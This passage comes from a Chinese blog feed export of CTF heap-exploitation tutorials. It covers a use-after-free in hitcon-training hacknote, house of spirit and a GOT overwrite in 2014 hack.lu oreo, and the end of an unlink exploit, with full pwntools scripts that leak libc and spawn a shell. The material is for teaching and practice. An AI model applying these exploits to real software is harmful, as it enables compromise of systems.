class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x400000)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"your choice :\n"</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"please input the size :\n"</span>, str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"your choice :\n"</span>, <span class="string">"2"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"delete which ?\n"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"your choice :\n"</span>, <span class="string">"3"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"show which ?\n"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">record</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"your choice :\n"</span>, <span class="string">"4"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"record which?\n"</span>, str(idx))</span><br><span class="line">    io.sendlineafter(<span class="string">"content?\n"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"your choice :\n"</span>, <span class="string">"5"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    </span><br><span class="line">    ptr = <span class="number">0x6020c0</span></span><br><span class="line">    add(<span class="number">0x40</span>)</span><br><span class="line">    add(<span class="number">0x80</span>)</span><br><span class="line">    add(<span class="number">0x40</span>)</span><br><span class="line">    add(<span class="number">0x40</span>)</span><br><span class="line">    payload = p64(<span class="number">0</span>) + p64(<span class="number">0x40</span>) + p64(ptr<span class="number">-0x18</span>) + p64(ptr<span class="number">-0x10</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x40</span>)</span><br><span class="line">    payload += p64(<span class="number">0x40</span>)</span><br><span class="line">    payload += p64(<span class="number">0x90</span>)</span><br><span class="line">    record(<span class="number">0</span>, payload)</span><br><span class="line">    record(<span class="number">1</span>, <span class="string">"1"</span>*<span class="number">0x10</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    <span class="comment">#show(0)</span></span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0x18</span> + p64(<span class="number">0x6020c8</span>+<span class="number">0x8</span>) + p64(<span class="number">0</span>) + p64(elf.got[<span class="string">'puts'</span>])</span><br><span class="line">    record(<span class="number">0</span>, payload)</span><br><span class="line">    show(<span class="number">2</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"the content is :"</span>)</span><br><span class="line">    io.recvline()</span><br><span class="line">    puts_addr = u64(io.recvline().strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">    io.success(<span class="string">"puts_addr: 0x%x"</span> % puts_addr)</span><br><span class="line">    libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    bin_sh_addr = libc_base + libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line">    free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">    </span><br><span class="line">    record(<span class="number">3</span>, <span class="string">"/bin/sh"</span>)</span><br><span class="line">    record(<span class="number">0</span>, p64(free_hook))</span><br><span class="line">    record(<span class="number">2</span>, p64(system_addr))</span><br><span class="line">    delete(<span class="number">3</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#delete(0)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>


<h2 id="题目下载地址"><a href="#题目下载地址" class="headerlink" title="题目下载地址"></a>题目下载地址</h2><p><a href="https://github.com/NoOne-hub/ctf-save" target="_blank" rel="noopener">点我，快点我</a></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>实操的时候发觉自己点是知道了，找漏洞点能力还待提升，利用起来也是得多调试下</p>
]]></content>
      <categories>
        <category>二进制</category>
        <category>pwn</category>
        <category>堆</category>
      </categories>
      <tags>
        <tag>pwn， 堆</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn堆入门系列教程5</title>
    <url>/archives/undefined.html</url>
    <content><![CDATA[<h1 id="pwn堆入门系列教程5"><a href="#pwn堆入门系列教程5" class="headerlink" title="pwn堆入门系列教程5"></a>pwn堆入门系列教程5</h1><p><a href="https://xz.aliyun.com/t/6087" target="_blank" rel="noopener">pwn堆入门系列教程1</a><br><a href="https://xz.aliyun.com/t/6169" target="_blank" rel="noopener">pwn堆入门系列教程2</a><br><a href="https://xz.aliyun.com/t/6252" target="_blank" rel="noopener">pwn堆入门系列教程3</a><br><a href="https://xz.aliyun.com/t/6322" target="_blank" rel="noopener">pwn堆入门系列教程4</a></p><p>进入uaf学习了，这部分题目就一道题</p><h2 id="hitcon-training-hacknote"><a href="#hitcon-training-hacknote" class="headerlink" title="hitcon-training-hacknote"></a>hitcon-training-hacknote</h2><p>这道题其实很简单，不过要冷静下才能做，我当时有点急躁，浪费一个钟才搞出来？冷静下来10分钟懂了</p><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">del_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index :"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">  v1 = atoi(&amp;buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Out of bound!"</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( notelist[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(*(notelist[v1] + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">free</span>(notelist[v1]);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Success"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a id="more"></a>




<h3 id="漏洞利用过程"><a href="#漏洞利用过程" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h3><p>具体分析不讲了，ctf-wiki上讲的很清楚， 我大致讲一下就是要利用要覆盖到他的content指针，这样的话print的时候会调用到另一个函数</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">'./'</span> + <span class="string">'hacknote'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="comment">#ctx.binary = './' + 'hacknote'</span></span><br><span class="line">ctx.binary = exe</span><br><span class="line">libc = elf.libc</span><br><span class="line">ctx.debug_remote_libc = <span class="literal">False</span></span><br><span class="line">ctx.remote_libc = libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    io = ctx.start()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     i386-32-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x8048000)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Note size :"</span>, str(size))</span><br><span class="line">    io.sendlineafter(<span class="string">"Content :"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"2"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Index :"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Print</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"3"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Index :"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Exit</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"4"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    ptr = <span class="number">0x08048986</span></span><br><span class="line">    add(<span class="number">0x20</span>, <span class="string">'aaaa'</span>)</span><br><span class="line">    add(<span class="number">0x20</span>, <span class="string">'bbbb'</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">0x8</span>, p32(ptr))</span><br><span class="line">    Print(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>

<p>接下来进入fastbin attack,fastbin attack有三个题目</p>
<h2 id="2014-hack-lu-oreo"><a href="#2014-hack-lu-oreo" class="headerlink" title="2014 hack.lu oreo"></a>2014 hack.lu oreo</h2><p>补充函数说明：</p>
<ul>
<li>fgets函数会在输入完成后自动在结尾添加一个’\0’，比如我们输入1234加上我们的回车总共是1234’\x0a’’\x00’他sub_80485EC这个函数会将\x0a变成\x00<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g2ydm1wq4ej30li04uwf2.jpg" alt="1"></li>
</ul>
<h3 id="结构体构造"><a href="#结构体构造" class="headerlink" title="结构体构造"></a>结构体构造</h3><p>开头调试的时候一直不理解他的结构体是如何构造出来的，然后ida解析出来的跟他图片上所谓结构体格格不入，所以手动调试了一下午，知道了他的结构体是如何构造的</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">gum</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> decription[<span class="number">25</span>];</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">27</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个结构体是经过调试以及看汇编得出来的，</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">sub_8048644</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v1; <span class="comment">// [esp+18h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  v1 = dword_804A288;</span><br><span class="line">  dword_804A288 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x38</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( dword_804A288 )</span><br><span class="line">  &#123;</span><br><span class="line">    *((_DWORD *)dword_804A288 + <span class="number">13</span>) = v1;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Rifle name: "</span>);</span><br><span class="line">    fgets(dword_804A288 + <span class="number">25</span>, <span class="number">56</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    sub_80485EC(dword_804A288 + <span class="number">25</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Rifle description: "</span>);</span><br><span class="line">    fgets(dword_804A288, <span class="number">56</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    sub_80485EC(dword_804A288);</span><br><span class="line">    ++dword_804A2A4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Something terrible happened!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里可以看出filename从25开始的，推出前面的description为25，而name长度为27是如何推出来的呢？看图<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g2f93s8owgj31hc0sjwrg.jpg" alt="2"></p>
<p>我这是在输出函数</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">sub_8048729</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *i; <span class="comment">// [esp+14h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Rifle to be ordered:\n%s\n"</span>, <span class="string">"==================================="</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = dword_804A288; i; i = (<span class="keyword">char</span> *)*((_DWORD *)i + <span class="number">13</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Name: %s\n"</span>, i + <span class="number">25</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Description: %s\n"</span>, i);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"==================================="</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>这里下的断点，你看ida解析出来的什么鬼，i+13，莫名奇妙的写法，完全看不懂，然后我定位到这里断点后，他加的值是0x34，他是从结构体开头加的0x34(10进制:52)，然后取出下一个指针，也就是next指针，继续进行循环，ida解析出的i+13完全乱来的，52-25 = 27，所以大小就这么退出来了，不理解这个结构体，这道题很多写法都看不懂，比如他的偏移什么，理解了就好构造了。</p>
<h3 id="整体思路"><a href="#整体思路" class="headerlink" title="整体思路"></a>整体思路</h3><p>题目里有堆溢出，我们可以通过堆溢出溢出到结构体的next指针，让next指针指向got表某一项，从而泄露出地址，进而求出libc的地址，求出libc的地址过后，在利用house of sprit，free掉一个自己伪造的chunk,进而达到覆写got表成one_gadget，然后通过调用该函数获得权限</p>
<h3 id="初始化函数"><a href="#初始化函数" class="headerlink" title="初始化函数"></a>初始化函数</h3><p>将堆的各个操作写成函数，因为堆里有很多重复操作，所以这样会比较方便</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(name, description)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"1"</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">    p.sendline(description)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"2"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"==================================="</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"3"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(payload)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"4"</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">puts</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"5"</span>)</span><br></pre></td></tr></table></figure>

<h3 id="leak地址"><a href="#leak地址" class="headerlink" title="leak地址"></a>leak地址</h3><p>我们知道他有个next指针，所以我们覆盖掉他的next指针，在利用show函数就可以打印任意地址的内容了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#first leak the libc</span></span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">27</span> + p32(puts_got)</span><br><span class="line">add(payload, <span class="string">'a'</span>*<span class="number">25</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">"==================================="</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Description: "</span>)</span><br><span class="line">result = p.recvuntil(<span class="string">"==================================="</span>)[:<span class="number">4</span>]</span><br><span class="line">puts_addr = u32(result)</span><br><span class="line">log.success(<span class="string">"puts_got = &#123;:#x&#125;"</span>.format(puts_addr))</span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">sys_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">bin_sh = libc_base + libc.search(<span class="string">'/bin/sh'</span>).next()</span><br></pre></td></tr></table></figure>

<p>这样就leak出puts的地址，接着就可以获得libc地址</p>
<h3 id="填充大小并修改next指针"><a href="#填充大小并修改next指针" class="headerlink" title="填充大小并修改next指针"></a>填充大小并修改next指针</h3><p>这题目有个计算数值的变量，也就是说你malloc一个，他就会加1，我们可以将这里当作chunk大小，因为一个枪支结构体大小为0x38,所以堆块大小为0x40,我们将其大小提升至0x40，并让最后一个堆块的next指针指向这块</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> i &lt; <span class="number">0x3f</span>:</span><br><span class="line">    add(<span class="string">'a'</span>*<span class="number">27</span> + p32(<span class="number">0</span>), <span class="string">'b'</span>*<span class="number">25</span>)</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">27</span> + p32(<span class="number">0x804A2A8</span>)</span><br><span class="line">add(payload, <span class="string">'a'</span>*<span class="number">25</span>)</span><br></pre></td></tr></table></figure>

<p>0x804a2a4是count的地址，所以+4就是堆块的数据段</p>
<h3 id="绕过检测"><a href="#绕过检测" class="headerlink" title="绕过检测"></a>绕过检测</h3><ol>
<li><p>对齐检查<br>在此处的检查中，要求堆块具有16bytes对齐，所以chunk header的起始地址应为0x**0的形式。</p>
</li>
<li><p>fake chunk 的size大小检查<br>按照上文中chunk的结构布局，使当前fake chunk的size为合适的大小，能够充足利用并且加入fastbin(0x10-0x80)，</p>
</li>
<li><p>next chunk 的size大小检查<br>除了当前chunk的大小，与目标地址物理相邻的内存空间也应按照堆块的结构将size位置改写为能够加入fastbin的合适的大小的数值。</p>
</li>
<li><p>标记位检查</p>
</li>
</ol>
<p>This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREVINUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED_ (second lsb) and _NON_MAIN_ARENA (third lsb) bits cause problems…. note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">### begin fake </span></span><br><span class="line">payload = p8(<span class="number">0</span>)*<span class="number">0x20</span> + p32(<span class="number">0x40</span>) + p32(<span class="number">0x100</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x34</span>, <span class="string">'b'</span>)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x80</span>, <span class="string">'c'</span>)</span><br><span class="line">edit(payload)</span><br><span class="line">delete()</span><br><span class="line">p.recvuntil(<span class="string">'Okay order submitted!\n'</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/60wx 0x804a2c0-0x20</span><br><span class="line">0x804a2a0:	0x00000000	0x00000040	0x0804a2c0	0x00000000</span><br><span class="line">0x804a2b0:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x804a2c0:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x804a2d0:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x804a2e0:	0x00000040	0x00000100	0x62626262	0x62626262</span><br><span class="line">0x804a2f0:	0x62626262	0x00000000	0x63636363	0x63636363</span><br><span class="line">0x804a300:	0x63636363	0x63636363	0x63636363	0x63636363</span><br><span class="line">0x804a310:	0x63636363	0x63636363	0x63636363	0x63636363</span><br><span class="line">0x804a320:	0x63636363	0x63636363	0x63636363	0x63636363</span><br><span class="line">0x804a330:	0x63636363	0x63636363	0x63636363	0x00636363</span><br><span class="line">0x804a340:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x804a350:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x804a360:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x804a370:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x804a380:	0x00000000	0x00000000	0x00000000	0x00000000</span><br></pre></td></tr></table></figure>

<p>可以看下内存中的内容,这就是构造完成后的图，然后free掉0x804a2a0这个大小为0x40的堆块，然后在fastbin中是FILO，所以你在申请的堆块就是申请到的是0x804a2a0这个堆块，在0x0804a2a8这个堆块的数据部分的东西就很重要了</p>
<h3 id="覆写got表"><a href="#覆写got表" class="headerlink" title="覆写got表"></a>覆写got表</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p32(elf.got[<span class="string">'strlen'</span>])</span><br><span class="line">payload = payload.ljust(<span class="number">25</span>,<span class="string">'a'</span>)</span><br><span class="line">add(<span class="string">'b'</span>*<span class="number">27</span> + p32(<span class="number">0</span>), payload)</span><br><span class="line">payload = p32(sys_addr) + <span class="string">";/bin/sh\x00"</span></span><br><span class="line">edit(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>这里ctf-wiki用的是strlen表，<strong>然后这里有个小细节。。。记得第二个位置才是结构体的开头，所以payload要放在add的第二个位置</strong>，构造payload为strlen的地址，然后在用edit函数进行编辑</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">Message</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v0; <span class="comment">// ST1C_4</span></span><br><span class="line"></span><br><span class="line">  v0 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Enter any notice you'd like to submit with your order: "</span>);</span><br><span class="line">  fgets(dword_804A2A8, <span class="number">128</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  sub_80485EC(dword_804A2A8);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>edit函数在ida里的原样，就是从0x804a2a8指向的空间写东西，这里指向的空间是0x0804a2c0也就是我们刚刚payload写入的位置，然后进行编辑</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/60wx 0x804a2a8-0x8</span><br><span class="line">0x804a2a0:	0x00000001	0x00000041	0x0804a250	0x61616161</span><br><span class="line">0x804a2b0:	0x61616161	0x61616161	0x61616161	0x61616161</span><br><span class="line">0x804a2c0:	0x62000061	0x62626262	0x62626262	0x62626262</span><br><span class="line">0x804a2d0:	0x62626262	0x62626262	0x62626262	0x00000000</span><br><span class="line">0x804a2e0:	0x0000000a	0x00000100	0x62626262	0x62626262</span><br><span class="line">0x804a2f0:	0x62626262	0x00000000	0x63636363	0x63636363</span><br><span class="line">0x804a300:	0x63636363	0x63636363	0x63636363	0x63636363</span><br><span class="line">0x804a310:	0x63636363	0x63636363	0x63636363	0x63636363</span><br><span class="line">0x804a320:	0x63636363	0x63636363	0x63636363	0x63636363</span><br><span class="line">0x804a330:	0x63636363	0x63636363	0x63636363	0x00636363</span><br><span class="line">0x804a340:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x804a350:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x804a360:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x804a370:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x804a380:	0x00000000	0x00000000	0x00000000	0x00000000</span><br></pre></td></tr></table></figure>

<p>你看，地址变成了0x804a250</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">► 0x80487eb    call   fgets@plt &lt;0x8048480&gt;</span><br><span class="line">       s: 0x804a250 (strlen@got.plt) —▸ 0xf7e3d440 ◂— 0x7c8b5756</span><br><span class="line">       n: 0x80</span><br><span class="line">       stream: 0xf7f715a0 (_IO_2_1_stdin_) ◂— 0xfbad208</span><br></pre></td></tr></table></figure>

<p>就是got表的地址<br>然后编辑过后调用strlen就会出发了，这里我有个不懂的地方就是将got表覆盖成system的地址，然后我不知道如何进行传参数，ctf-wiki给的是‘;/bin/sh\x00’，经过测试system(“abcd;/bin/sh”)在c语言里也是可以获得权限的，<br>这里是调用strlen，strlen求的是payload长度，所以相当于system(payload)<br>也就是相当于system(p32(sys_addr)+”;/bin/sh”)</p>
<p>并且他前面求出了bin_sh地址，他也没用上。应该也是这里卡住了一小会，我是转头改用了one_gadget</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p32(elf.got[<span class="string">'puts'</span>])</span><br><span class="line">payload = payload.ljust(<span class="number">25</span>,<span class="string">'a'</span>)</span><br><span class="line">add(<span class="string">'b'</span>*<span class="number">27</span> + p32(<span class="number">0</span>), payload)</span><br><span class="line">one_gadget = libc_base + <span class="number">0x5fbc5</span></span><br><span class="line">payload = p32(one_gadget)</span><br><span class="line">edit(payload)</span><br><span class="line">puts()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>完结，撒花<br>完整exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ctx.binary = <span class="string">'oreo'</span></span><br><span class="line">ctx.remote_libc = <span class="string">'libc.so.6'</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./oreo'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ctx.debug_remote_libc == <span class="literal">False</span>:</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ctx.remote_libc</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    <span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">    p = 